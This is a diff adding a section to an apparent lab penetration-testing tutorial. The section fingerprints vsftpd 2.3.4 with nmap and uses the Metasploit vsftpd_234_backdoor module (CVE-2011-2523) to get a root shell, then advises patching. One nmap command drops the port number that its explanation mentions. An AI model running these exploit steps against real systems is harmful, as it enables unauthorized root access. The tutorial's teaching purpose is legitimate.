@@ -305,7 +305,85 @@ Nmap done: 1 IP address (1 host up) scanned in 61.80 seconds
 
 Throughout this tutorial, let's look at one method - the easiest for each service running - to get a shell. Frankly, I don't know much either, I'm just going to stick with the most obvious solution. Though, there are a million different ways to exploit everything that I'm about to show you.
 
-## Telnet (port `21`)
+## FTP (port `21`)
+
+FTP is a standard network protocol used to transfer files between a client and a server over a TCP/IP network. It’s one of the oldest protocols for file sharing and allows users to upload or download files to/from a server. Even though FTP is efficient, it doesn't offer any encryption, meaning data, including usernames and passwords, will be transmitted in plain text. This makes it vulnerable to security breaches, so it's often replaced by more secure protocols like SFTP or FTPS for sensitive transfers.
+
+Let's start by identifying the version of the FTP deamon using nmap:
+
+```bash
+nmap -sV -p 192.168.1.41
+```
+
+Here, the `-p 21` flag tells nmap to scan only for port 21. Below is my output:
+
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 02:12 EDT
+Nmap scan report for 192.168.1.41
+Host is up (0.0052s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
+```
+
+The scan shows that the FTP server is running `vsftpd 2.3.4`. I can also confirm this by trying to connect directly:
+
+![alt text](image-3.png)
+
+`vsFTPd` stands for Very Secure FTP Daemon. There are other types of FTP servers as well, such as: [ProFTPD](http://www.proftpd.org/) and many more...
+
+Searching for the version `2.3.4` of vsFTPd, I came across [this article](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) about a backdoor command execution vulnerability ([CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)).
+
+There is a Metasploit module that allows us to exploit this easily. Let's launch Metasploit and search for vsftpd to see all related modules:
+
+```bash
+search vsftpd
+```
+
+![alt text](image-4.png)
+
+The module we need is called `exploit/unix/ftp/vsftpd_234_backdoor`. Let's select it and list out all of the available options.
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+```bash
+options
+```
+
+![alt text](image-5.png)
+
+There are only two required options before we can run the exploit:
+
+1. `RHOSTS`: The IP address of the target FTP server.
+2. `RPORT`: The target port (defaults to 21).
+
+Now, we set the target IP address (`RHOSTS`):
+
+```bash
+set RHOSTS 192.168.1.41
+```
+
+And finally, we execute the exploit:
+
+```bash
+run
+```
+
+As you can see in the image below, we now have root access:
+
+![alt text](image-7.png)
+
+How exactly can we fix this? Well, keep your software up to date.
+
+For servers, use LTS versions of distributions to ensure the packages you install are tested and stable. Also, regularly check for security pacthes and install them. In this case, a patch for this vulnerability was released within a week after the code resulting in it was first pushed.
+
+## Telnet (port `23`)
 
 Telnet is a network protocol used for remote communication with devices. It allows users to access and manage systems remotely. Telnet doesn't use any sort of encryption and is therefore considered insecure.
 
